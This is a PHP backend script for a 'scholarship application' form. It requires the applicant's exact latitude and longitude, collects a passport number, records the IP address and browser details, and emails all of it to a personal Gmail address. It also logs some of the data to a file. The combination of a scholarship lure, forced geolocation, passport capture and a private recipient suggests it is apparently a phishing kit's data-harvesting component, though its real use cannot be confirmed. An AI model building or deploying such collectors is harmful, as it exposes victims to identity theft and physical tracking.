<?php
// Helper to remove CRLF to mitigate header injection
function clean_header($str) {
    return trim(str_replace(["\r", "\n"], '', $str));
}

// Collect submitted data (use null-coalescing to avoid undefined index)
$name = isset($_POST['name']) ? trim($_POST['name']) : '';
$email = isset($_POST['email']) ? trim($_POST['email']) : '';
$passport = isset($_POST['passport']) ? trim($_POST['passport']) : '';
$lat = isset($_POST['lat']) ? trim($_POST['lat']) : '';
$lon = isset($_POST['lon']) ? trim($_POST['lon']) : '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$time = date("Y-m-d H:i:s");
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// Basic server-side validation
$errors = [];
if ($name === '') {
    $errors[] = 'Name is required.';
}
if ($email === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $errors[] = 'A valid email is required.';
}
if ($lat === '' || !is_numeric($lat) || (float)$lat < -90 || (float)$lat > 90) {
    $errors[] = 'Valid latitude is required.';
}
if ($lon === '' || !is_numeric($lon) || (float)$lon < -180 || (float)$lon > 180) {
    $errors[] = 'Valid longitude is required.';
}

if (!empty($errors)) {
    header('Content-Type: application/json');
    echo json_encode(['success' => false, 'errors' => $errors]);
    exit;
}

// Sanitize values for output/storage (don't use sanitized values for logic checks above)
$safe_name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
$safe_email = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
$safe_passport = htmlspecialchars($passport, ENT_QUOTES, 'UTF-8');
$safe_lat = $lat;
$safe_lon = $lon;
$safe_agent = htmlspecialchars($agent, ENT_QUOTES, 'UTF-8');

// Build message (plain text)
$message = "New Application Received\n\n";
$message .= "Name: $safe_name\n";
$message .= "Email: $safe_email\n";
$message .= "Passport: $safe_passport\n";
$message .= "IP: $ip\n";
$message .= "Latitude: $safe_lat\n";
$message .= "Longitude: $safe_lon\n";
$message .= "User Agent: $safe_agent\n";
$message .= "Time: $time\n";

// Email setup
$to = "abdullahishakir88@gmail.com"; // recipient
$subject = "Scholarship Application Submission";

// Sending configuration: choose SMTP via PHPMailer (recommended) or fallback to mail()
$use_smtp = false; // set to true after configuring SMTP settings and installing PHPMailer
$smtp_config = [
    'host' => 'smtp.example.com',
    'port' => 587,
    'username' => 'smtp-user@example.com',
    'password' => 'smtp-password',
    'secure' => 'tls' // 'ssl' or 'tls'
];
$from_email = 'no-reply@yourdomain.com';
$from_name = 'No Reply';

$sent = false;
$send_error = '';

if ($use_smtp) {
    // Attempt to send via PHPMailer + SMTP
    if (file_exists(__DIR__ . '/vendor/autoload.php')) {
        require_once __DIR__ . '/vendor/autoload.php';
        $mail = new PHPMailer\PHPMailer\PHPMailer(true);
        try {
            $mail->isSMTP();
            $mail->Host = $smtp_config['host'];
            $mail->SMTPAuth = true;
            $mail->Username = $smtp_config['username'];
            $mail->Password = $smtp_config['password'];
            $mail->SMTPSecure = $smtp_config['secure'];
            $mail->Port = $smtp_config['port'];
            $mail->setFrom(clean_header($from_email), $from_name);
            $mail->addAddress(clean_header($to));
            $mail->Subject = $subject;
            $mail->Body = $message;
            $mail->send();
            $sent = true;
        } catch (Exception $e) {
            $send_error = $mail->ErrorInfo ?: $e->getMessage();
            $sent = false;
        }
    } else {
        $send_error = 'PHPMailer not installed. Run: composer require phpmailer/phpmailer';
    }
} else {
    // Fallback to PHP mail() with safer headers
    $headers = 'From: ' . clean_header($from_email) . "\r\n";
    // Use the applicant's email as Reply-To (cleaned) to reduce injection risk
    $headers .= 'Reply-To: ' . clean_header($email) . "\r\n";
    $headers .= 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-Type: text/plain; charset=UTF-8' . "\r\n";

    if (mail($to, $subject, $message, $headers)) {
        $sent = true;
    } else {
        $sent = false;
        $send_error = 'mail() returned false or failed to hand off to MTA.';
    }
}

// Log attempt for debugging (append-only, do not store sensitive data in production without consent)
$log_entry = [
    'time' => $time,
    'to' => $to,
    'sent' => $sent,
    'error' => $send_error,
    'name' => $safe_name,
    'email' => $safe_email,
    'ip' => $ip
];
@file_put_contents(__DIR__ . '/email_log.txt', json_encode($log_entry) . PHP_EOL, FILE_APPEND | LOCK_EX);

header('Content-Type: application/json');
if ($sent) {
    echo json_encode(['success' => true, 'message' => '✅ Application submitted successfully.']);
} else {
    // Provide a non-sensitive error message to the client; the detailed error is in the log
    echo json_encode(['success' => false, 'message' => '❌ Error sending application. Check server mail settings.', 'details' => $send_error]);
}
?>
